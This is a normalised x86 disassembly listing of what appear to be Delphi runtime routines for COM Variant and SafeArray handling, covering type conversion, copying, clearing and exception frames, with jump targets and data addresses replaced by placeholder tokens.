push sub_40e81e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fcc
retn
sub_40e824
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e86e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e875
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_40e878
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40eabd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eac4
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403fcc
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403fcc
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
jmp r-xdata
dec eax
je r-xdata
call sub_40e644
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
jmp r-xdata
jmp r-xdata
call sub_40e734
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40aef0
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
jmp r-xdata
jmp r-xdata
sub_40ead8
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e698
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e788
jmp r-xdata
jmp r-xdata
call sub_40e878
sub_40eb0c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eb56
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb5d
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_40eb74
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40eba4
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40eba4
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ec00
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40eacc
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40eacc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40eb74
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40eacc
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40eacc
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40eba4
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40eacc
mov eax [ ebp - 0x314 ]
call sub_40edf8
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40ed7c
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40eacc
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403fa8
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_4107e4
test al al
je r-xdata
mov eax ebx
call sub_40ec00
jmp r-xdata
push ebx
call VariantClear
call sub_40eacc
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40ee14
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ee44
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ee44
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40eea0
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40eacc
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40eacc
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40edf8
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e824
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40eacc
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40eacc
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ee14
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40ee44
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40eacc
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40eacc
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f074
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40ed7c
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40eacc
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403ffc
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_4107e4
test al al
je r-xdata
mov ecx sub_40f06c
mov edx esi
mov eax ebx
call sub_40eea0
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40eacc
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f120
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f074
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40ed7c
sub_40f164
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404688
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40ead8
pop ebx
pop ebp
retn 0x8
sub_40f19c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404688
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40ead8
pop ebx
pop ebp
retn 0x8
sub_40f1d4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f28a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404688
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40ead8
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f291
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fcc
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_404230
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407c3c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4047d4
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404230
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407c00
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4047d4
jmp r-xdata
jmp r-xdata
call sub_40e734
sub_40f298
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f357
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f335
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40ead8
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404798
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404884
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404230
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f33c
lea eax [ ebp - 0x10 ]
call sub_40edf8
retn
sub_40f364
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f3ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f120
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f44c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f3c1
lea eax [ ebp - 0x10 ]
call sub_40edf8
retn
sub_40f3c8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4107e4
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f43d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403ffc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40edf8
retn
sub_40f44c
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f983
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f485 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403ffc
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403fa8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407f50
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403ffc
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407f50
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403ffc
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4094e4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403ffc
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4094e4
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403ffc
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40f164
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404230
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40f19c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404230
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_404798
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404884
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404230
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_40f1d4
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404230
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_407f50
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403ffc
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407f50
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403ffc
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_407f50
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403ffc
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_40803c
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403ffc
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_40803c
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403ffc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f44c
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f298
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403ffc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f98a
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403fcc
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_4046a0
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403fcc
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_4046a0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fcc
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40f364
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403ffc
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403ffc
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e698
test ah 0x40
je r-xdata
mov eax esi
call sub_403fa8
mov edx eax
mov eax ebx
call sub_40f3c8
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_40f298
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403ffc
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f298
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403ffc
jmp r-xdata
jmp [ eax * 4 + jump_table_40f719 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f50
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403ffc
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407f50
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403ffc
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4094e4
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403ffc
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_4094e4
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403ffc
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40f164
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404230
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_40f19c
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404230
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4041d0
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40f1d4
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404230
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f50
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403ffc
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f50
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403ffc
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f50
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403ffc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_40803c
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403ffc
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_40803c
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403ffc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f44c
jmp r-xdata
sub_40f990
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40fa3a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fa1d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40ead8
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404798
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404884
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fa24
lea eax [ ebp - 0x10 ]
call sub_40edf8
retn
sub_40fa48
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fa9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f120
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40fb74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40faa5
lea eax [ ebp - 0x10 ]
call sub_40edf8
retn
sub_40faac
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40fb64
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4107e4
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fb6b
lea eax [ ebp - 0x20 ]
call sub_404688
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fb47
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404798
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404884
xor eax eax
pop edx
pop ecx
pop ecx
